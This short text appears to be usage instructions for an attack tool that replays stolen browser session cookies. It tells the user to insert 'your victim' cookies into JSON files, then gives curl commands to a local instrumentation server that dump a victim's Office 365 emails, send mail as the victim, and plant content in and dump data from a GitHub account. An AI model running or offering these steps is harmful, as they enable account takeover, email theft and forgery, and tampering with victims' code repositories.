NOTE: make sure you change the cookies array with your victim ones in the JSOn files before issuing the commands.
The cookies here are kept only for structure reference.

# Office 365 examples:
curl -X POST -H "Content-Type: application/json" -d @./office365.dumpEmails.json http://localhost:3000/instrument

curl -X POST -H "Content-Type: application/json" -d @./office365.writeEmail.json http://localhost:3000/instrument

# GitHub example:
curl -X POST -H "Content-Type: application/json" -d @./github.plantAndDump.json http://localhost:3000/instrument
